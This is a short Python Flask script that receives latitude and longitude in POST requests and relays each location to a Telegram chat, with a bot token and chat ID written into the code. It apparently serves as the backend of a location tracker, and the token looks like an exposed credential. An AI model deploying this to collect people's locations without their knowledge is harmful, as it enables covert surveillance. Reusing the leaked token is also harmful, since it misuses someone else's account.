from flask import Flask, request
import requests

app = Flask(__name__)

# تنظیمات تلگرام
TOKEN = "7884088853:AAGf_3qdQVZMhQEy73P68T30SyA4rPrEMpw"
CHAT_ID = "7570861617"

@app.route('/', methods=['POST'])
def index():
    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")
    if lat and lon:
        text = f"📍 Location: {lat}, {lon}"
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text})
    return 'OK'
